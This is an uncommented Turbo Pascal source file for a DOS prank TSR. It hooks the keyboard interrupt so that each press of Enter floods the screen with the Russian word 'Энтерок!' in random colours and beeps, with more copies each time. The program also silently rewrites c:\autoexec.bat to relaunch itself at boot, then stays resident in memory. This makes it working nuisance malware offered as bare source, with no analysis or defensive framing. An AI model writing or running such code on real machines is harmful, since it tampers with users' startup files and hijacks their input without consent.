{$M $800,0,0 }
uses Crt, Dos;
var
  KbdIntVec : Procedure;
  s:array[1..200] of string;
  g:text;
  c:string;
  k:byte;
  l,f:LongInt;
{$F+}
procedure Keyclick; interrupt;
begin
  if Port[$60] = $1C then
    begin
    l:=l+1;
    for f:=1 to l do
    begin
      gotoxy(Random(72)+1,Random(25)+1);
      textcolor(Random(15)+1);
      write('Энтерок!');
      Sound(5000);
      Delay(110);
      Nosound
    end;
    end;
  inline ($9C);
  KbdIntVec;
end;
{$F-}
begin
  GetDir(0,c);
  k:=1;
  Assign(g,'c:\autoexec.bat');
  Reset(g);
  while not EOF(g) do begin readln(g,s[k]);k:=k+1 end;
  Close(g);
  Rewrite(g);
  for f:=1 to k-2 do writeln(g,s[f]);
  if c[Length(c)]<>'\' then writeln(g,c+'\went')
                       else writeln(g,c+'went');
  write(g,s[k-1]);
  Close(g);
  l:=0;
  GetIntVec($9,@KbdIntVec);
  SetIntVec($9,Addr(Keyclick));
  Keep(0)
end.

